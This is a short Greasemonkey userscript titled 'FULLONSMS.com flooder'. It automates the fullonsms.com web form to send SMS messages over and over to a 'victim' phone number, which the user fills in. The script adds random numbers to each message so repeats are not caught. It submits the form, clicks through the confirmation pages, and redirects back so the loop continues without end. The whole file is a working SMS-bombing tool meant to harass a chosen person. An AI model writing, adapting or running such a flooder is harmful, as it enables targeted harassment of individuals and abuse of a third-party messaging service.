// ==UserScript==
// @name          FULLONSMS.com  flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*fullonsms.com/*
// ==/UserScript==

var victim=0; //Enter victims no. here, u can also add multiple no's seperated by ,(comma)
var msg="!!"; //Enter ur msg


if(document.location=="http://fullonsms.com/home.php"||document.location=="http://www.fullonsms.com/home.php"||document.location=="http://fullonsms.com/home.php?Login=1"||document.location=="http://www.fullonsms.com/home.php?Login=1")
{
document.getElementById('MobileNos').value=victim;
document.getElementById('Message').value=Math.floor(Math.random()*456456)+msg+Math.floor(Math.random()*456456);
void(0);
document.forms[0].submit();
}

if(document.location=="http://fullonsms.com/sc.php"||document.location=="http://www.fullonsms.com/sc.php")
document.getElementsByName('IntSubmit')[0].click();

if(document.location=="http://fullonsms.com/SaveContacts.php?MobileNos="+victim||document.location=="http://www.fullonsms.com/SaveContacts.php?MobileNos="+victim)
{
window.top.hidePopWin();
document.location="http://fullonsms.com/home.php";
}

if(document.location=="http://fullonsms.com/MsgSent.php"||document.location=="http://www.fullonsms.com/MsgSent.php")
document.location="http://fullonsms.com/home.php";
